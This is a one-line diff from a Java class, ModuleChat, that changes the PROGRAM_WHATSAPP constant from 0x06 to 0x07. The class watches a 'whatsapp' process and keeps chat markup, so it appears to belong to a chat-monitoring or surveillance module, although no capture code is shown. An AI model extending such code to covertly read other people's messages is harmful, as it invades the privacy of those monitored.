@@ -65,7 +65,7 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 
 	private static final String TAG = "ModuleChat";
 
-	private static final int PROGRAM_WHATSAPP = 0x06;
+	private static final int PROGRAM_WHATSAPP = 0x07;
 
 	String pObserving = "whatsapp";
 	Markup markupChat;
